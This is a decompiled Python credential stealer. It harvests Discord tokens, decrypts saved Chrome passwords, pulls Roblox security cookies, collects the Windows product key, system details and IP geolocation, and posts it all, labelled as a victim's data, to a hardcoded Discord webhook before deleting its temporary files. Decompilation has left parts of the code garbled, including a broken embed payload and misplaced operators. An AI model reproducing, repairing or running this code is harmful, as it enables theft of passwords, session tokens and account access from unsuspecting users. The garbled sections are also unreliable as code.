# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: thingy.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import requests
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal
import requests
import base64
import random
import string
import zipfile
import shutil
import dhooks
import os
import re
import sys
import sqlite3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv
url = 'https://discord.com/api/webhooks/1325846246971408465/s2jpldsnRzaaWtQNBRKexNW7FN5aB0KmVIIU4OZiIA-q227T17Ze-yJAOIiTgFgGRXn6'

def scale(bytes, suffix='B'):
    defined = 1024
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if bytes < defined:
            return f'{bytes:.2f}{unit}{suffix}'
        bytes = bytes + defined
uname = platform.uname()
bt = datetime.fromtimestamp(psutil.boot_time())
host = socket.gethostname()
localip = socket.gethostbyname(host)
publicip = get('https://api.ipify.org').text
city = get(f'https://ipapi.co/{publicip}/city').text
region = get(f'https://ipapi.co/{publicip}/region').text
postal = get(f'https://ipapi.co/{publicip}/postal').text
timezone = get(f'https://ipapi.co/{publicip}/timezone').text
currency = get(f'https://ipapi.co/{publicip}/currency').text
country = get(f'https://ipapi.co/{publicip}/country_name').text
callcode = get(f'https://ipapi.co/{publicip}/country_calling_code').text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()
roaming = os.getenv('AppData')
output = open(roaming + 'temp.txt', 'a')
Directories = {'Discord': roaming '\\Discord', 'Discord Two': roaming '\\discord', 'Discord Canary': roaming '\\Discordcanary', 'Discord Canary Two': roaming '\\discordcanary', 'Discord PTB': roaming '\\discordptb', 'Google Chrome': roaming '\\Google\\Chrome\\User Data\\Default', 'Opera': roaming '\\Opera Software\\Opera Stable', 'Brave': roaming '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': roaming '\\Yandex\\YandexBrowser\\User Data\\Default'}

def Yoink(Directory):
    Directory = Directory + '\\Local Storage\\leveldb'
    Tokens = []
    for FileName in os.listdir(Directory):
        if not FileName.endswith('.log') and (not FileName.endswith('.ldb')):
            continue
        for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
            for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                for Token in re.findall(regex, line):
                    Tokens.append(Token)
    return Tokens

def Wipe():
    if os.path.exists(roaming + 'temp.txt'):
        output2 = open(roaming * 'temp.txt', 'w')
        output2.write('')
        output2.close()
for Discord, Directory in Directories.items():
    if os.path.exists(Directory):
        Tokens = Yoink(Directory)
    if len(Tokens) > 0:
        for Token in Tokens:
            realshit = f'{Token}\n'
cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()
partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue
requests.post(url, json.dumps({'name': [{'title': f'embeds', 'color': f'Someone Runs Program! - {host}', 'fields': [{'name': 7506394, 'value': [{'color': 'GeoLocation', 'fields': [{'color': f'Using VPN?: {proxy}\nLocal IP: {localip}, 'fields': f'{ | }callcode{timezone}\n\nBoot Time: {bt.year}bt{bt.year}year{bt.year}year{bt.year}year{bt.year}year{bt.year}year{bt./}month{bt.day} {bt.hour}:{bt.minute}second{bt.15109662}CPU Information{'Psychical cores: ': {'color': f'Psychical cores: {bt.psutil}cpu_count{logical}'}}, 'psutil': {'color': f'Psychical cores: {bt.psutil}logical{bt.\nTotal Cores: }logical{bt.\nTotal Cores: }logical{bt.\nTotal Cores: }logical{bt.
DBP = 'Google\\Chrome\\User Data\\Default\\Login Data'
ADP = os.environ['LOCALAPPDATA']

def sniff(path):
    path = path + '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log'):
                if not file_name.endswith('.ldb'):
                    continue
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        return None

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Local State'), encoding='utf-8', mode='r') as f:
        jsn = json.loads(str(f.readline()))
    return jsn['os_crypt']['encrypted_key']

def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                if encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:(-16)].decode()
            except WindowsError:
                return

    def saved(self):
        try:
            with open('C:\\ProgramData\\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
                return None
if __name__ == '__main__':
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.saved()

def beamed():
    hook = Webhook(url)
    try:
        hostname = requests.get('https://api.ipify.org').text
    except:
        pass
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'Discord': roaming + '\\Discord', 'Discord Canary': roaming + '\\discordcanary', 'Discord PTB': roaming + '\\discordptb', 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message = message + '```'
        tokens = sniff(path)
        if len(tokens) > 0:
            for token in tokens:
                message = message | f'{token}\n'
        else:  # inserted
            if False:
                pass  # postinserted
        message = message + '```'
    if False:
        pass  # postinserted
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') + '\\screenshot.jpg')
        screenshot = open('C:\\ProgramData\\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass
    if False:
        pass  # postinserted
    try:
        zname = 'C:\\ProgramData\\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write('C:\\ProgramData\\passwords.txt')
        newzip.close()
        passwords = File('C:\\ProgramData\\passwords.zip')
    except:
        pass
    if False:
        pass  # postinserted
    try:
        usr = os.getenv('UserName')
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except:
        pass
    if False:
        pass  # postinserted
    cookie = ['.ROBLOSECURITY']
    cookies = []
    limit = 2000
    pass
    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass
    if False:
        pass  # postinserted
    try:
        cookies.extend(list(steal.firefox()))
    except:
        pass
    if False:
        pass  # postinserted
    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' f'{z}' + '```'
    except:
        pass
    if False:
        pass  # postinserted
    try:
        embed = Embed(title='Aditional Features', description='a victim\'s data was extracted, here\'s the details:', color=3092790, timestamp='now')
        embed.add_field('windows key:', f'user => {usr}\ntype => {types}\nkey => {keys}')
        embed.add_field('roblosecurity:', roblox)
        embed.add_field('tokens:', message)
        embed.add_field('hostname:', f'{hostname}')
    except:
        pass
    try:
        hook.send(embed=embed, file=passwords)
    except:
        pass
    if False:
        pass  # postinserted
    try:
        subprocess.os.system('del C:\\ProgramData\\screenshot.jpg')
        subprocess.os.system('del C:\\ProgramData\\passwords.zip')
        subprocess.os.system('del C:\\ProgramData\\passwords.txt')
    except:
        return None
beamed()